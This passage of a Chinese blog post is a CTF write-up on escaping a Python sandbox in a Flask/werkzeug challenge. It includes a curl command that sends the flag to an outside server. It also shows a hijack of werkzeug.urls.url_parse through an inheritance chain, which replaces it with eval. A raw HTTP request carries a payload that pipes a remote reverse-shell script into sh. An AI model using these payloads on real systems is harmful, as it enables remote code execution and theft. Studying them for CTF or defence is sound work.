<p>不过此做法，如果其他人也在做题，不管其请求什么，同时也会得到flag    </p>
<p>所以可以反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;__import__(&quot;os&quot;).popen(&quot;curl -d &#96;&#x2F;readflag&#96; vps:port&quot;).read()</span><br></pre></td></tr></table></figure>

<p>solution3:<br>[TokyoWesterns 2018 shrine writeup](TokyoWesterns 2018 shrine writeup)<br>本 题 的 主 要 思 路 就 是 劫 持 函 数 ， 通 过 替 换 某 一 个 函 数 为 eval system等 ， 然 后 变 量 外 部 可 控 ，<br>即 可 RCE<br>看 了 一 下 大 家 RCE的 做 法 都 不 相 同 ， 但 只 要 是 劫 持 都 算 在 预 期 内 ， 只 是 链 不 一 样 ， 这 里 就 只<br>贴 一 下 自 己 当 时 挖 到 的 方 法 了<br>首 先 要 找 到 一 个合 适 的 函 数 ， 满 足 参 数 可 控 ， 最 终 找 到 werkzeug.urls.url_parse这 个 函 数 ， 参<br>数 就 是 HTTP包 的 路 径<br>比 如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxxxxxxx</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101</span><br><span class="line">Firefox&#x2F;77.0</span><br></pre></td></tr></table></figure>
<p>参 数 就 是 ‘/index.php’<br>然 后 是 劫 持 ， 我 们 无 法 输 入 任 何 括 号 和 空 格 ， 所 以 无 法 直 接 import werkzeug<br>需 要 通 过 一 个 继 承 链 关 系 来 找 到 werkzeug这 个 类<br>直 接 拿 出 tokyowestern 2018年 shrine的 找 继 承 链 脚 本<br>（ <a href="https://eviloh.github.io/2018/09/03/TokyoWesterns-2018-shrine-writeup/" target="_blank" rel="noopener">https://eviloh.github.io/2018/09/03/TokyoWesterns-2018-shrine-writeup/</a>)<br>访 问 一 下 ， 即 可 在 1.txt最 下 面 看 到 继 承 链<br>最 终 找 到 是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.__class__._get_current_object.__globals__[&#39;__loader__&#39;].__class__.__weakref__.__objclass__.contents.__globals__[&#39;__loader__&#39;].exec_module.__globals__[&#39;_bootstrap_external&#39;]._bootstrap.sys.modules[&#39;werkzeug.urls&#39;]</span><br></pre></td></tr></table></figure>
<p>但 是 发 现 我 们 不 能 输 入 任 何 引 号 ， 这 个 考 点 也 考 多 了 ， 可 以 通 过 request的 属 性 进 行 bypass<br>一 些 外 部 可 控 的 request属 性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">request.host</span><br><span class="line">request.content_md5</span><br><span class="line">request.content_encoding</span><br><span class="line">所 以 请 求 1</span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: __loader__</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101</span><br><span class="line">Firefox&#x2F;77.0</span><br><span class="line">Accept:</span><br><span class="line">text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie:</span><br><span class="line">experimentation_subject_id&#x3D;IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%</span><br><span class="line">3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang&#x3D;zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-MD5: _bootstrap_external</span><br><span class="line">Content-Encoding: werkzeug.urls</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 246</span><br><span class="line">cmd&#x3D;request.__class__._get_current_object.__globals__[request.host].__class__._</span><br><span class="line">_weakref__.__objclass__.contents.__globals__[request.host].exec_module.__global</span><br><span class="line">s__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_p</span><br><span class="line">arse&#x3D;eval</span><br></pre></td></tr></table></figure>
<p>然 后 url_parse函 数 就 变 成 了 eval<br>然 后 访 问 第 二 个 请 求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST __import__(&#39;os&#39;).system(&#39;curl$&#123;IFS&#125;https:&#x2F;&#x2F;shell.now.sh&#x2F;8.8.8.8:1003|sh&#39;)</span><br><span class="line">HTTP&#x2F;1.1</span><br><span class="line">Host: __loader__</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101</span><br><span class="line">Firefox&#x2F;77.0</span><br><span class="line">Accept:</span><br><span class="line">text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie:</span><br><span class="line">experimentation_subject_id&#x3D;IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%</span><br><span class="line">3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang&#x3D;zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-MD5: _bootstrap_external</span><br><span class="line">Content-Encoding: werkzeug.urls</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 246</span><br><span class="line">cmd&#x3D;request.__class__._get_current_object.__globals__[request.host].__class__._</span><br><span class="line">_weakref__.__objclass__.contents.__globals__[request.host].exec_module.__global</span><br><span class="line">s__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_p</span><br><span class="line">arse&#x3D;eval</span><br></pre></td></tr></table></figure>

<p>参考文章:<br><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/" target="_blank" rel="noopener">python 沙箱逃逸与SSTI</a><br><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">Python 沙箱逃逸</a><br><a href="https://hanjianwei.com/2013/07/25/python-mro/" target="_blank" rel="noopener">Python的方法解析顺序</a><br><a href="https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes" target="_blank" rel="noopener">Bypass Python sandboxes</a><br><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">Python沙箱逃逸的n种姿势</a><br><a href="https://xz.aliyun.com/t/2308" target="_blank" rel="noopener">用python继承链搞事情</a><br><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">Python沙箱逃逸总结</a><br><a href="https://xz.aliyun.com/t/6159" target="_blank" rel="noopener">利用OpCode绕过Python沙箱</a><br><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">从一个CTF题目学习Python沙箱逃逸</a><br><a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">Python沙箱逃逸小结</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/b55137d6.html">https://blog.cfyqy.com/article/b55137d6.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/21a2aa63.html"><i class="fas fa-angle-left">&nbsp;</i><span>javascript原型链污染</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/e6a569f4.html"><span>命令执行及绕过</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>